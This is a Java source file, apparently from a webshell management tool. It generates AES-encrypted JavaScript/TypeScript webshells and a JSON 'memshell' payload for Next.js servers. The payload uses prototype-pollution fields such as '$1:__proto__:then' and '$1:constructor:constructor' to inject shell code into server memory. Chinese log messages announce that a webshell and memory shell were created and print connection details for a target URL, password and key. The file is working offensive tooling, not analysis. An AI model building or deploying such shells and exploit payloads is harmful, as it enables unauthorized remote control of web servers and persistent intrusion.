package shells.cryptions.jsAes;

import core.shellprocessor.StartProcessor;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import util.Log;
import util.TemplateEx;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"js", "ts"};

    private static InputStream loadTemplateFile(String resourcePath) {
        try {
            String sourcePath = "src/main/java/shells/cryptions/jsAes/" + resourcePath;
            if (Files.exists(Paths.get(sourcePath))) {
                return new FileInputStream(new File(sourcePath));
            }

            InputStream inputStream = Generate.class.getResourceAsStream(resourcePath);
            if (inputStream != null) {
                return inputStream;
            }

            inputStream = Generate.class.getClassLoader().getResourceAsStream(
                    "shells/cryptions/jsAes/" + resourcePath
            );
            return inputStream;
        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] GenerateShellLoder(String suffix, String pass, String secretKey, String codeName) {
        byte[] data = null;

        try {
            InputStream inputStream = loadTemplateFile("template/" + codeName + "GlobalCode.bin");
            if (inputStream == null) {
                Log.error("Cannot find template file: template/" + codeName + "GlobalCode.bin");
                return null;
            }
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);

            inputStream = loadTemplateFile("template/" + codeName + "Code.bin");
            if (inputStream == null) {
                Log.error("Cannot find template file: template/" + codeName + "Code.bin");
                return null;
            }
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{routePath}", pass);

            String shellTemplateName = "aesApi".equals(codeName) ? "shellApi." + suffix : "shell." + suffix;
            inputStream = loadTemplateFile("template/" + shellTemplateName);
            if (inputStream == null) {
                Log.error("Cannot find template file: template/" + shellTemplateName);
                return null;
            }
            String template = new String(functions.readInputStream(inputStream));
            inputStream.close();

            String template2 = template.replace("{globalCode}", globalCode).replace("{code}", code);
            template2 = TemplateEx.run(template2);
            data = StartProcessor.process(template2.getBytes(), suffix);
            if (Arrays.equals(data, template2.getBytes()) && suffix.equals(SUFFIX[1])) {
                globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                code = code.replace("<", "&lt;").replace(">", "&gt;");
                template2 = template.replace("{globalCode}", globalCode).replace("{code}", code);
                data = template2.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }

        return data;
    }

    public static String GenerateMemshellJson(String password, String secretKey, String outputPath) {
        try {
            String json = generateMemshellJsonInternal(password, secretKey);

            if (json == null) {
                Log.error("Failed to generate memshell JSON");
                return null;
            }

            if (outputPath != null && !outputPath.isEmpty()) {
                try {
                    File outputFile = new File(outputPath);
                    File parentDir = outputFile.getParentFile();
                    if (parentDir != null && !parentDir.exists()) {
                        parentDir.mkdirs();
                    }

                    try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                        fos.write(json.getBytes(StandardCharsets.UTF_8));
                        fos.flush();
                    }
                    Log.log("Memshell JSON saved to: " + outputFile.getAbsolutePath());
                } catch (Exception e) {
                    Log.error("Failed to save memshell JSON to file: " + e.getMessage());
                }
            }

            return json;
        } catch (Exception e) {
            Log.error("GenerateMemshellJson error: " + e.getMessage());
            Log.error(e);
            return null;
        }
    }

    private static String generateMemshellJsonInternal(String password, String secretKey) {
        try {
            InputStream inputStream = loadTemplateFile("template/base64GlobalCode_memshell.bin");
            if (inputStream == null) {
                Log.error("Cannot find memshell template file: template/base64GlobalCode_memshell.bin");
                return null;
            }

            String memshellCode = new String(functions.readInputStream(inputStream), StandardCharsets.UTF_8);
            inputStream.close();

            String payloadStoreName = "p_" + functions.md5(password).substring(0, 8);

            memshellCode = memshellCode.replace("{pass}", password)
                    .replace("{secretKey}", secretKey)
                    .replace("{routePath}", password)
                    .replace("{payloadStoreName}", payloadStoreName);

            String json = "{\n" +
                    "  \"then\": \"$1:__proto__:then\",\n" +
                    "  \"status\": \"resolved_model\",\n" +
                    "  \"reason\": -1,\n" +
                    "  \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\",\n" +
                    "  \"_response\": {\n" +
                    "    \"_prefix\": \"" + escapeJsonString(memshellCode) + "\",\n" +
                    "    \"_chunks\": \"$Q2\",\n" +
                    "    \"_formData\": {\n" +
                    "      \"get\": \"$1:constructor:constructor\"\n" +
                    "    }\n" +
                    "  }\n" +
                    "}";

            return json;
        } catch (Exception e) {
            Log.error("generateMemshellJsonInternal error: " + e.getMessage());
            Log.error(e);
            return null;
        }
    }

    private static String escapeJsonString(String str) {
        if (str == null) {
            return "";
        }
        return str.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    public static byte[] GenerateShellLoderWithMemshell(String suffix, String pass, String secretKey, String codeName, boolean generateMemshell) {
        byte[] shellData = GenerateShellLoder(suffix, pass, secretKey, codeName);

        if (generateMemshell && shellData != null) {
            try {
                String timestamp = String.valueOf(System.currentTimeMillis());
                String fileName = "nextjs_memshell_" + pass + "_" + timestamp + ".json";

                String currentDir = System.getProperty("user.dir");
                File outputFile = new File(currentDir, fileName);
                String outputPath = outputFile.getAbsolutePath();

                String json = GenerateMemshellJson(pass, secretKey, outputPath);

                if (json != null) {
                    Log.log("========================================");
                    Log.log("Webshell 和内存马已生成！");
                    Log.log("========================================");
                    Log.log("Webshell 文件: shell." + suffix + " (通过对话框保存)");
                    Log.log("内存马 JSON: " + outputPath);
                    Log.log("");
                    Log.log("连接信息：");
                    Log.log("  URL:      http://target.com/" + pass);
                    Log.log("  密码:     " + pass);
                    Log.log("  密钥:     " + secretKey);
                    Log.log("  加密器:   JS_AES_BASE64");
                    Log.log("  Payload:  NextJsDynamicPayload");
                    Log.log("========================================");
                }
            } catch (Exception e) {
                Log.error("Failed to generate memshell JSON: " + e.getMessage());
            }
        }

        return shellData;
    }
}

